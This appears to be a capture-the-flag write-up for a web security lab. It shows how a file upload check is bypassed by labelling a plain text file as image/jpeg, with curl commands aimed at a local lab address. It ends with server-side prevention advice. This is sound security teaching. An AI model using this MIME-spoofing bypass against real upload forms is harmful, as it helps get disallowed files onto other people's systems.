# File Upload

## 1. Discovery

The upload page is available at `?page=upload`. Its file field is named `uploaded`, and the request uses `multipart/form-data`. Test whether the server checks the file content or trusts the MIME type in the upload request. The reproduction commands create and remove a harmless temporary text file.

## 2. Exploitation

Upload a harmless text file with its normal MIME type, then upload the same file with the `image/jpeg` MIME type. Run the full block in one shell so that the temporary file remains available for both requests:

```bash
upload_file=$(mktemp)
trap 'rm -f "$upload_file"' EXIT
printf 'Darkly upload validation test\n' > "$upload_file"
printf 'Normal MIME type (text/plain):\n'
curl -sS -i \
-F "uploaded=@$upload_file;type=text/plain" \
"http://127.0.0.1:8080/?page=upload"
printf '\nSpoofed MIME type (image/jpeg):\n'
curl -sS \
-F "uploaded=@$upload_file;type=image/jpeg" \
"http://127.0.0.1:8080/?page=upload" \
| grep "Good Job"
rm -f "$upload_file"
trap - EXIT
```

Observed result: the `text/plain` upload is rejected. The same text file marked as `image/jpeg` is accepted, and the response displays the challenge flag.

## 3. Technical Explanation

The file content is plain text in both requests. Only the MIME type in the multipart request changes. The text upload is rejected, but the upload marked as `image/jpeg` is accepted and returns the flag. This shows that the client supplied MIME type affects the result. It does not prove which validation checks the server uses or that the uploaded file was processed as a real image.

## 4. Security Impact

An attacker can label a file with a permitted MIME type even when its content is different. If an application trusts that label, it may store or serve files that do not meet its file policy. Depending on how the application stores and serves uploads, this can expose users to harmful content or create further risks. This test did not demonstrate code execution.

## 5. Prevention

Validate uploads on the server. Allow only required file types. Check the file signature and decode the file with a trusted library when an image is required. Do not rely on the filename extension or client supplied MIME type. Set file size limits, generate a safe server side filename, store uploads outside the web root where possible, and disable execution in the upload directory.

## 6. Flag Verification

Run this command block from the repository root. It creates a temporary text file, matches the response's `Good Job` flag text, compares the extracted value with `mandatory/file_upload/flag`, and removes the local file:

```bash
upload_file=$(mktemp)
trap 'rm -f "$upload_file"' EXIT
printf 'Darkly upload validation test\n' > "$upload_file"
curl -s \
-F "uploaded=@$upload_file;type=image/jpeg" \
"http://127.0.0.1:8080/?page=upload" \
| grep -oE 'Good Job[^<]*[a-f0-9]{64}' \
| grep -oE '[a-f0-9]{64}' \
| diff - mandatory/file_upload/flag
result=$?
rm -f "$upload_file"
trap - EXIT
test "$result" -eq 0
```

An exit status of `0` means that the retrieved flag matches the saved flag. The address `127.0.0.1:8080` is our local VirtualBox port-forwarding address. Adjust it if the evaluation environment uses a different address or port.
